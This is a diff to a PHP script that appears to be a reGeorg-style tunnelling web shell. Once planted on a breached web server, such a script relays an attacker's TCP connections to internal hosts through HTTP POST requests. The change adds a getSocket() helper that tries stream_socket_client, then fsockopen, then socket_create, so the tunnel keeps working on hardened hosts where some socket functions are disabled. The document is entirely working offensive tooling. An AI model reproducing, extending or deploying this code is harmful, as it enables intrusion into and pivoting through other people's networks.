@@ -37,7 +37,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     switch($cmd){
 		case "CONNECT":
 			{
-				$target = $targetIP;
+				/*$target = $targetIP;
 				$port = (int)$targetPort;
 				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 				if ($sock === false)
@@ -52,6 +52,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 					return;
 				}
 				socket_set_nonblock($sock);
+                   */
+				$sockObj=getSocket($targetIP,$targetPort);
+				 $sock = $sockObj["s"];
+                                                        $s_type = $sockObj["s_type"];
+                 if ($s_type == 'error')
+                 				{
+                 					echo "\x37\x21\x49\x36Failed connecting to target".$sock;
+                 					return;
+                 				}
+
+
+
+                                                        $socketRead = "socket_read";
+                                                        $socketWrite = "socket_write";
+                                                        $socketClose = "socket_close";
+                                                        $socketSelect = "socket_select";
+                                                        if ($s_type == 'stream') {
+                                                            $socketRead = "fread";
+                                                            $socketWrite = "fwrite";
+                                                            $socketClose = "fclose";
+                                                            $socketSelect = "stream_select";
+                                                        }
+            if ($s_type=='stream')
+            {
+                stream_set_blocking($sock,false);
+            }
+            else
+            {
+                socket_set_nonblock($sock);
+            }
 				@session_start();
 				$_SESSION["run"."_".$socketHash] = true;
                 $_SESSION["writebuf"."_".$socketHash] = "";
@@ -77,7 +107,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 					session_write_close();
                     if ($writeBuff != "")
 					{
-						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
+						$i = $socketWrite($sock, $writeBuff, strlen($writeBuff));
 						if($i === false)
 						{
 							@session_start();
@@ -86,7 +116,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 							echo "\x37\x21\x49\x36Failed writing socket";
 						}
 					}
-					while ($o = socket_read($sock, 512)) {
+					while ($o = $socketRead($sock, 512)) {
 					if($o === false)
 						{
                             @session_start();
@@ -103,7 +133,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     }
                     #sleep(0.2);
 				}
-                socket_close($sock);
+                $socketClose($sock);
 			}
 			break;
 		case "DISCONNECT":
@@ -157,3 +187,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 	}
 }
 }
+function getSocket($ip, $port)
+{
+    $resultObj=array();
+    if (($f = 'stream_socket_client') && is_callable($f)) {
+        $s = $f("tcp://{$ip}:{$port}");
+        $s_type = 'stream';
+    }
+    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
+        $s = $f($ip, $port);
+        $s_type = 'stream';
+    }
+    if (!$s && ($f = 'socket_create') && is_callable($f)) {
+        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = @socket_connect($s, $ip, $port);
+        if (!$res) {
+            die();
+        }
+        $s_type = 'socket';
+    }
+    if (!$s_type) {
+        $s_type="error";
+        $s='no socket funcs';
+    }
+    if (!$s) {
+        $s_type="error";
+        $s='no socket';
+    }
+    $resultObj["s"]=$s;
+    $resultObj["s_type"]=$s_type;
+    return $resultObj;
+}
+
